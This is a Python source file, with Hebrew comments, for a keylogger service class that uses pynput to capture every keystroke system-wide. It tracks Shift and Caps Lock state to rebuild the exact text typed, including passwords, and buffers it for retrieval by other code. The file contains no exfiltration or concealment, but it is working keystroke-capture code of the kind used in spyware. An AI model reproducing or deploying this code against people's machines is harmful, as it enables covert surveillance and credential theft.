import threading
from pynput import keyboard
from interfaces.ikeyLogger import Ikeylogger

class Keyloggerservice(Ikeylogger):
    def __init__(self):
        self.logged_keys = []
        self.listener = None
        self.lock = threading.Lock()
        self.shift_pressed = False
        self.caps_lock_on = False
   
    NUMPAD_VK_MAP = {
        96: '0',  # NumPad 0
        97: '1',  # NumPad 1
        98: '2',  # NumPad 2
        99: '3',  # NumPad 3
        100: '4', # NumPad 4
        101: '5', # NumPad 5
        102: '6', # NumPad 6
        103: '7', # NumPad 7
        104: '8', # NumPad 8
        105: '9', # NumPad 9
        110: '.'  # NumPad .
    }

    def special_tag(self, key):
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            
            # בדיקה אם צריך אות גדולה
            if char.isalpha():
                # אם CAPS LOCK דלוק או SHIFT לחוץ (אבל לא שניהם), אות גדולה
                if (self.caps_lock_on and not self.shift_pressed) or (not self.caps_lock_on and self.shift_pressed):
                    return char.upper()
                else:
                    return char.lower()
            elif self.shift_pressed and char in "1234567890-=[]\\;',./":
                # מיפוי של מקשים עם SHIFT
                shift_map = {
                    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                    '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                    '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
                    ';': ':', "'": '"', ',': '<', '.': '>', '/': '?'
                }
                return shift_map.get(char, char)
            else:
                return char
                
        elif hasattr(key, 'vk') and key.vk in self.NUMPAD_VK_MAP:
            return self.NUMPAD_VK_MAP[key.vk]
        elif key == keyboard.Key.space:
            return ' '
        elif key == keyboard.Key.enter:
            return '\n'
        elif key == keyboard.Key.tab:
            return '    '
        elif key == keyboard.Key.backspace:
            return '<DEL>'
        elif key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
            return ''  # לא נוסיף כלום עבור SHIFT
        elif key in (keyboard.Key.ctrl_r, keyboard.Key.ctrl_l):
            return '<CTL>'
        elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
            return '<ALT>'
        elif key == keyboard.Key.caps_lock:
            return ''  # לא נוסיף כלום עבור CAPS LOCK
        elif str(key).startswith('Key.f'):  # פונקציות F1-F12
            return f'[{key}]'
        else:
            return f'[{key}]'

    def _on_press(self, key):
        try:
            with self.lock:
                # עדכון מצב SHIFT
                if key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
                    self.shift_pressed = True
                elif key == keyboard.Key.caps_lock:
                    # החלפת מצב CAPS LOCK
                    self.caps_lock_on = not self.caps_lock_on
                
                # הוספת המקש ללוג
                key_text = self.special_tag(key)
                if key_text:  # רק אם יש טקסט להוסיף
                    self.logged_keys.append(key_text)
        except Exception:
            pass

    def _on_release(self, key):
        try:
            with self.lock:
                # עדכון מצב SHIFT כאשר משחררים
                if key in (keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l):
                    self.shift_pressed = False
        except Exception:
            pass

    def start_logging(self):
        with self.lock:
            self.logged_keys = []
            self.shift_pressed = False
            # לא נאפס CAPS LOCK כי זה מצב גלובלי
        
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self):
        with self.lock:
            keys_copy = self.logged_keys.copy()
            self.logged_keys.clear()
        return keys_copy